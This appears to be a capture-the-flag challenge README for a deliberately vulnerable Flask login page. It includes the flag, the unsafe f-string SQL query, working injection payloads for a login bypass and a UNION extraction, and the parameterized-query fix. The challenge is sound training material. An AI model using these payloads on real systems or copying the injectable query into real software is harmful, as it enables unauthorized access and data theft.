# Challenge 1 — "The Vault"
**Category:** Web
**Vulnerability:** SQL Injection
**Difficulty:** Easy / Medium
**Flag:** `cusectf{sql_inj3ct10n_unl0cks_the_vault}`

---

## Scenario

> You've stumbled upon an internal corporate portal called "The Vault." Rumor has it the admin hid something valuable in there. You don't have credentials — but maybe you don't need them.

---

## Setup

```bash
pip install flask
python app.py
# Visit http://localhost:5000
```

---

## Vulnerability

The `/login` route builds its SQL query via f-string interpolation with no sanitization:

```python
query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
```

---

## Solution (spoilers below — for challenge authors only)

### Step 1 — Login bypass

Use a classic OR-based bypass in the username field:

```
username: admin'--
password: (anything)
```

The resulting query becomes:
```sql
SELECT id, username, role FROM users
WHERE username = 'admin'--' AND password = '...'
```
The `--` comments out the password check, logging you in as `admin`.

### Step 2 — Collect the flag

After logging in as admin, the dashboard displays all secrets from the `secrets` table, including the admin's secret which contains the flag:

```
cusectf{sql_inj3ct10n_unl0cks_the_vault}
```

### Alternative — UNION-based extraction (for extra credit)

Players who want to go deeper can use a UNION injection to pull data without bypassing auth:

```
username: ' UNION SELECT 1, content, 'admin' FROM secrets WHERE owner='admin'--
password: (anything)
```

---

## Learning Objectives

- Understanding how unsanitized SQL queries lead to authentication bypass
- UNION-based data extraction
- Mitigation: use parameterized queries (`db.execute("... WHERE username=?", (username,))`)
